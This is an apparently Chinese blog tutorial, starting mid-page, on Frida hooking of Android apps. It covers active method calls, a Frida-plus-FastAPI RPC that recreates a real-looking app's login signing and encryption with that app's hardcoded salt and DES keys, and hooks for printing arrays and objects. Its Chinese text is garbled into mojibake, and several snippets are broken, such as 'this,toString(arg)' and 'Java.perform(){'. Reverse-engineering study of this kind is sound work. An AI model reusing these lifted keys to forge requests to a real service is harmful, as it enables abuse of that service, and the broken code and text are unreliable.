class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(it.<span class="title function_">hasNext</span>())&#123;</span><br><span class="line">                <span class="keyword">var</span>  keystr = it.<span class="title function_">next</span>();</span><br><span class="line">                <span class="keyword">var</span>  valuestr = map.<span class="title function_">get</span>(keystr);</span><br><span class="line">                result += valuestr;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// map.put(&quot;pass&quot;, &quot;jingyi&quot;);</span></span><br><span class="line">            <span class="comment">// map.put(&quot;guanwang&quot;, &quot;bbs.125.la&quot;);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// var retval = this.show(map);</span></span><br><span class="line">            <span class="comment">// console.log(retval);</span></span><br><span class="line">            <span class="comment">// return retval;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hookä¸»åŠ¨è°ƒç”¨">Hookä¸»åŠ¨è°ƒç”¨</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest11</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//é™æ€æ–¹æ³•çš„ä¸»åŠ¨è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">var</span> str = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> bytes = str.$new(<span class="string">&quot;xiaojianbang&quot;</span>).<span class="title function_">getBytes</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> rsa = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.RSA&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> retval = rsa.<span class="title function_">encrypt</span>(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> base64 = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Base64&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> result = base64.<span class="title function_">encodeToString</span>(retval, <span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//éé™æ€æ–¹æ³•çš„ä¸»åŠ¨è°ƒç”¨1 (æ–°å»ºä¸€ä¸ªå¯¹è±¡å»è°ƒç”¨)</span></span><br><span class="line">        <span class="keyword">var</span> res = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>).$new(<span class="string">&quot;æ—¥å…ƒ&quot;</span>, <span class="number">300000</span>).<span class="title function_">getInfo</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Utils&quot;</span>);</span><br><span class="line">        res = utils.$new().<span class="title function_">myPrint</span>([<span class="string">&quot;xiaojianbang&quot;</span>, <span class="string">&quot;is very good&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;jingyi&quot;</span>, <span class="string">&quot;is very good&quot;</span>]);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//éé™æ€æ–¹æ³•çš„ä¸»åŠ¨è°ƒç”¨2 (è·å–å·²æœ‰çš„å¯¹è±¡è°ƒç”¨)</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.xiaojianbang.app.Money&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(obj.<span class="property">_name</span>.<span class="property">value</span> == <span class="string">&quot;æ—¥å…ƒ&quot;</span>)&#123;</span><br><span class="line">                    res = obj.<span class="title function_">getInfo</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fridaå®ç°rpc">fridaå®ç°rpc</h2><ul><li>xjbç¬¬22è¯¾æ—¶</li><li>demoä¸ºç¬¬ä¹è¯¾çš„å˜Ÿå˜Ÿç‰›</li><li>å‰ç½®ï¼šäº†è§£äº†appå…³é”®ç®—æ³•</li></ul><ol><li><p>ç™»å½•å˜Ÿå˜Ÿç‰›ï¼ŒåŒæ—¶ä½¿ç”¨charlesè¿›è¡ŒæŠ“åŒ…<img src="/posts/b00b5fdb.htm/image-20231126143811910.png" alt="image-20231126143811910"></p></li><li><p>å‘ç°å…³é”®è¾“å‡ºEncryptï¼Œä½¿ç”¨fridaçš„è‡ªåç®—æ³•è„šæœ¬è¿›è¡Œæµ‹è¯•<br>å‘½ä»¤ <code>frida -UF -l  frida_zitu.js com.dodonew.online</code></p><p>å¾—åˆ°ä¸€å †æ•°æ®ï¼Œç”¨charlesæŠ“åˆ°çš„åŒ…çš„æ•°æ®åœ¨è¿›è¡Œç´¢å¼•ï¼Œå¦‚ â€˜NIszaqFPos1vd0pFqKlB42Np5itPxaNHâ€™</p><p>åˆ°å¦‚ä¸‹ä½ç½®<img src="/posts/b00b5fdb.htm/image-20231126143647286.png" alt="image-20231126143647286">å¯çŸ¥è¿™ä¸ªappç®—æ³• doFinalç»“æœå¦‚ä¸Šå›¾ï¼Œå‘ä¸Šå¯æ‰¾åˆ°ä¼ è¿›å»çš„å‚æ•° doFinalå‚æ•°</p><p>æœ‰ä¸ªsig nï¼Œé€šè¿‡ç¬¬ä¹è¯¾çš„å­¦ä¹ çŸ¥é“è¿™ä¸ªsignæ˜¯é€šè¿‡appçš„å…³é”®å‡½æ•°md5åŠ å¯†è€Œæ¥ï¼Œæ‰€ä»¥ç´¢å¼•è¿™ä¸ªsignå€¼çœ‹ä¸€ä¸‹é‚£ä¸ªmd5å‡½æ•°çš„å‚æ•°<img src="/posts/b00b5fdb.htm/image-20231126144005343.png" alt="image-20231126144005343">å¦‚ä¸Šå›¾æ‰¾åˆ°äº†å‚æ•°</p><p>çŸ¥é“äº†ä¸¤ä¸ªå…³é”®å‡½æ•°RequestUtil.encodeDesMapå’ŒUtils.md5çš„å‚æ•°å’Œè¿”å›ç»“æœï¼Œå¯ä»¥å†™ä¸€ä¸ªfridaçš„rpc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jsCode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function fridarpc(username,passward)&#123;</span></span><br><span class="line"><span class="string">    var result;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var time = new Date().getTime(); //è·å¾—timeStampæ—¶é—´æˆ³</span></span><br><span class="line"><span class="string">        //time = &#x27;1700980477428&#x27;;</span></span><br><span class="line"><span class="string">        //var passward = &#x27;930516iu&#x27;;</span></span><br><span class="line"><span class="string">        //var username = &#x27;13785674926&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var string =Java.use(&quot;java.lang.String&quot;);</span></span><br><span class="line"><span class="string">        var signData = string.$new(&#x27;equtype=ANDROID&amp;loginImei=Android352530080139520&amp;timeStamp=&#x27; + </span></span><br><span class="line"><span class="string">        time + &#x27;&amp;userPwd=&#x27; + passward +&#x27;&amp;username=&#x27;+ username +&#x27;&amp;key=sdlkjsdljf0j2fsjk&#x27;);</span></span><br><span class="line"><span class="string">        var utils = Java.use(&#x27;com.dodonew.online.util.Utils&#x27;);  //md5</span></span><br><span class="line"><span class="string">        var sign = utils.md5(signData).toUpperCase();</span></span><br><span class="line"><span class="string">        console.log(&quot;signï¼š&quot;,sign);  //è¾“å‡ºsignå€¼</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        var requestUtil = Java.use(&#x27;com.dodonew.online.http.RequestUtil&#x27;);  //åŠ å¯†</span></span><br><span class="line"><span class="string">        var encryptDate = &#x27;&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android352530080139520&quot;,&quot;sign&quot;:&quot;&#x27;+ </span></span><br><span class="line"><span class="string">        sign +&#x27;&quot;,&quot;timeStamp&quot;:&quot;&#x27;+ time +&#x27;&quot;,&quot;userPwd&quot;:&quot;&#x27;+ passward +&#x27;&quot;,&quot;username&quot;:&quot;&#x27;+ username +&#x27;&quot;&#125;&#x27;;</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">        var Encrypt = requestUtil.encodeDesMap(encryptDate,&#x27;65102933&#x27;,&#x27;32028092&#x27;);</span></span><br><span class="line"><span class="string">        console.log(&quot;Encryptï¼š&quot;,Encrypt);</span></span><br><span class="line"><span class="string">        result = Encrypt;  </span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    return result;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">rpc.exports=&#123;</span></span><br><span class="line"><span class="string">    zxk1ng:fridarpc</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è°ƒç”¨fridaè„šæœ¬</span></span><br><span class="line">process = frida.get_device_manager().add_remote_device(<span class="string">&#x27;192.168.100.83:27042&#x27;</span>).attach(<span class="string">&quot;com.dodonew.online&quot;</span>)</span><br><span class="line">script = process.create_script(jsCode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*] Running å°è‚©è†€&#x27;</span>)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/get&quot;</span></span>) </span><span class="comment">#æ³¨æ„è¿™é‡Œurlä¸Šæ²¡æœ‰å®šä¹‰å‚æ•°</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">getEchoApi</span>(<span class="params">item_id, item_user, item_pass</span>):</span><br><span class="line">    <span class="comment">#fastapiä¼šèªæ˜çš„å‘ç°å®ƒä¸æ˜¯URLå‚æ•°,ç„¶åè‡ªåŠ¨å°†ä»–è¯†åˆ«ä¸ºparamå‚æ•°</span></span><br><span class="line">    <span class="comment">#RPCè¿œç¨‹è°ƒç”¨</span></span><br><span class="line">    result = script.exports.zxk1ng(item_user, item_pass)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;item_id&quot;</span>: item_id, <span class="string">&quot;item_retval&quot;</span>: result&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    uvicorn.run(app, port = <span class="number">8080</span>)</span><br><span class="line">Hook</span><br></pre></td></tr></table></figure></li></ol><h2 id="å‚æ•°æ˜¯æ•°ç»„ç±»å‹çš„Hookå§¿åŠ¿">å‚æ•°æ˜¯æ•°ç»„ç±»å‹çš„Hookå§¿åŠ¿</h2><p>å®ä¾‹å¦‚ä¸‹å›¾</p><p><img src="/posts/b00b5fdb.htm/image-20240628140526720.png" alt="image-20240628140526720"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Character Java.use(&quot;java.lang.Character&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å½“å‚æ•°æ˜¯charæ•°ç»„æ—¶ ==ã€‹Arrays.toString(arr[i])</span></span><br><span class="line">function <span class="title function_">charArray</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.use(<span class="string">&quot;java.util.Arrays&quot;</span>).toString.overload(<span class="string">&quot;[C&quot;</span>).implementation=function(arg)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*è¿›è¡Œå‚æ•°ä¿®æ”¹</span></span><br><span class="line"><span class="comment">            var myarg=Java.array(&#x27;char&#x27;,[&#x27;1&#x27;,&#x27;2&#x27;]);</span></span><br><span class="line"><span class="comment">            var result=this.toString(myarg);</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">var</span> tmp=Java.array(<span class="string">&#x27;char&#x27;</span>,arg); <span class="comment">//è½¬åŒ–ä¸ºcharç±»å‹çš„æ•° ç»„</span></span><br><span class="line">            <span class="keyword">var</span> result=<span class="built_in">this</span>.toString(arg);</span><br><span class="line">            <span class="keyword">var</span> str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;tmp.length;i++)&#123;</span><br><span class="line">                str+=tmp[i]+<span class="string">&quot; &quot;</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        console.log(str,result);</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;  </span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å½“å‚æ•°æ˜¯byteæ•°ç»„æ—¶ ==ã€‹Arrays.toString(Arrays.toString(arr[i]).getBytes())</span></span><br><span class="line">function <span class="title function_">bytesArray</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="comment">/*ä½¿ç”¨r0gson.dex</span></span><br><span class="line"><span class="comment">        var gson=Java.openClassFile(&quot;/data/local/tmp/r0gson.dex&quot;).load();</span></span><br><span class="line"><span class="comment">        var gson=Java.use(&quot;com.r0ysue.gson.Gson&quot;);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        </span><br><span class="line">        Java.use(<span class="string">&quot;java.util.Arrays&quot;</span>).toString.overload(<span class="string">&quot;[B&quot;</span>).implementation=function(arg)&#123;</span><br><span class="line">            <span class="keyword">var</span> tmp=Java.array(<span class="string">&#x27;byte&#x27;</span>,arg); <span class="comment">//è½¬åŒ–ä¸ºcharç±»å‹çš„æ•°ç»„</span></span><br><span class="line">            <span class="keyword">var</span> result=<span class="built_in">this</span>,toString(arg);</span><br><span class="line">            <span class="keyword">var</span> str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;tmp.length;i++)&#123;</span><br><span class="line">                str+=tmp[i]+<span class="string">&quot; &quot;</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        console.log(<span class="string">&quot;[1]&quot;</span>,str);</span><br><span class="line">            console.log(<span class="string">&quot;[2]&quot;</span>,JSON.stringify(arg));</span><br><span class="line">            console.log(<span class="string">&quot;[3]&quot;</span>,gson.$<span class="keyword">new</span>().toJson(arg)); <span class="comment">//ä½¿ç”¨r0gson.dex</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            var ByteString = Java.use(&quot;com.android.okhttp.okio.ByteString&quot;);</span></span><br><span class="line"><span class="comment">console.log(&quot;[4]&quot;,ByteString.of(arg).hex());</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    &#125;  </span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ–¹æ³•5 ç”³è¯·ç©ºé—´ å†™å…¥å†…å­˜ å†hexdump </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Javaç±»å‹ç±»å‹æ‰“å°">Javaç±»å‹ç±»å‹æ‰“å°</h2><p><img src="/posts/b00b5fdb.htm/image-20240628161004005.png" alt="image-20240628161004005"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//private char arr[][] = new char [4][];</span></span><br><span class="line">function <span class="title function_">main1</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">co_handle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Java.choose(<span class="string">&quot;ç±»å…¨è·¯å¾„&quot;</span>,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                co_handle=instance;</span><br><span class="line">            &#125;</span><br><span class="line">            onComplete:function()&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        console.log(<span class="string">&quot;arr&quot;</span>,co_handle.arr.value);</span><br><span class="line">        <span class="keyword">var</span> arr=Java.array(<span class="string">&quot;java.lang.Object&quot;</span>,co_handle.arr.value)</span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">             str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">             <span class="keyword">var</span> tmp=Java.array(<span class="string">&quot;char&quot;</span>,arr[i]);</span><br><span class="line">             <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;tmp.length;j++)&#123;</span><br><span class="line">                 str+=tmp[j]+<span class="string">&quot; &quot;</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             console.log(i,str);</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">setTimeout(main1,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Map&lt;String,String&gt; map = new HashMap&lt;&gt;() </span></span><br><span class="line">function <span class="title function_">main1</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">co_handle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Java.choose(<span class="string">&quot;ç±»å…¨è·¯å¾„&quot;</span>,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                co_handle=instance;</span><br><span class="line">            &#125;</span><br><span class="line">            onComplete:function()&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> map=Java.cast(co_handle.map.value,Java.use(<span class="string">&quot;java.util.HashMap&quot;</span>)); <span class="comment">//ä¸æ˜¯åŸºæœ¬ç±»å‹ å…ˆè¿›è¡Œç±»å‹è½¬åŒ–</span></span><br><span class="line">        console.log(<span class="string">&quot;map[1]&quot;</span>,map.toString());</span><br><span class="line">        </span><br><span class="line">        console.log(<span class="string">&quot;map[2]&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">iter_entry</span> <span class="operator">=</span> map.entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span>(iter_entry.hasNext())&#123;</span><br><span class="line">            <span class="keyword">var</span> entry=Java.cast(iter_entry.next(),Java.use(<span class="string">&quot;java.util.HashMap$Node&quot;</span>));</span><br><span class="line">            console.log(entry.getKey(),entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">         console.log(<span class="string">&quot;map[3]&quot;</span>);</span><br><span class="line">         <span class="type">var</span> <span class="variable">iter_key</span> <span class="operator">=</span> map.keySet().iterator();</span><br><span class="line">         <span class="keyword">while</span>(iter_key.hasNext())&#123;</span><br><span class="line">            <span class="keyword">var</span> key=iter_key.next();</span><br><span class="line">            console.log(key,map.get(key));</span><br><span class="line">        &#125;</span><br><span class="line">          </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">setTimeout(main1,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">function <span class="title function_">main1</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">co_handle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        Java.choose(<span class="string">&quot;ç±»å…¨è·¯å¾„&quot;</span>,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                co_handle=instance;</span><br><span class="line">            &#125;</span><br><span class="line">            onComplete:function()&#123;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">     <span class="comment">//Signal color = Signal.RED;</span></span><br><span class="line">        <span class="keyword">var</span> color=Java.cast(co_handle.color.value,Java.use(<span class="string">&quot;xxx.classname$Signal&quot;</span>));</span><br><span class="line">        console.log(color.toString());</span><br><span class="line">        console.log(color.name());     </span><br><span class="line">        console.log(color.ordinal());  <span class="comment">//æ‰“å°ç´¢å¼•</span></span><br><span class="line">     <span class="comment">//Water wJuice = new Juice()</span></span><br><span class="line">        <span class="keyword">var</span> wJuice=Java.cast(co_handle.wJuice.value,Java.use(<span class="string">&quot;xxx.xxx.Water&quot;</span>) );</span><br><span class="line">        console.log(wJuice.still(wJuice),wJuice.flow(wJuice));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> juice=Java.cast(co_handle.wJuice.value,Java.use(<span class="string">&quot;xxx.xxx.Juice&quot;</span>) );    </span><br><span class="line">        console.log(juice.still(juice),juice.flow(juice),juice.fillEnergy());</span><br><span class="line">      <span class="comment">// CheerInterface ibeer = new IBeer() åœ¨IBeerä¸­å®ç°è¿™ä¸ªæ¥å£ä¸­æ–¹æ³• </span></span><br><span class="line">        <span class="keyword">var</span> beer=Java.cast(co_handle.ibeer.value,Java.use(<span class="string">&quot;xxx.xxx.IBeer&quot;</span>));    </span><br><span class="line">        console.log(beer.cheer());</span><br><span class="line">         <span class="comment">//è‡ªå·±å®ç°æ¥å£æ„é€ </span></span><br><span class="line">        <span class="keyword">var</span> CheerInterface=Java.use(<span class="string">&quot;xxx.xxx.CheerInterface&quot;</span>); </span><br><span class="line">        <span class="keyword">var</span> mybeer=Java.registerClass(&#123;</span><br><span class="line">            name:<span class="string">&quot;xxx.xxx.beer&quot;</span>,  <span class="comment">//å®ç°çš„ç±»åï¼Œåº”è¯¥æ˜¯è‡ªå®šä¹‰</span></span><br><span class="line">            implements:[CheerInterface], <span class="comment">//å®ç°çš„æ¥å£æ•°ç»„</span></span><br><span class="line">            methods:&#123;              <span class="comment">//å®ç°çš„æ–¹æ³•</span></span><br><span class="line">                cheer:function()&#123;</span><br><span class="line">                    console.log(<span class="string">&quot;CHEER!!!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        mybeer.$<span class="keyword">new</span>().cheer();</span><br><span class="line">    &#125;)   </span><br><span class="line">&#125;</span><br><span class="line">setTimeout(main1,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/posts/b00b5fdb.htm/image-20240628202422344.png" alt="image-20240628202422344"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 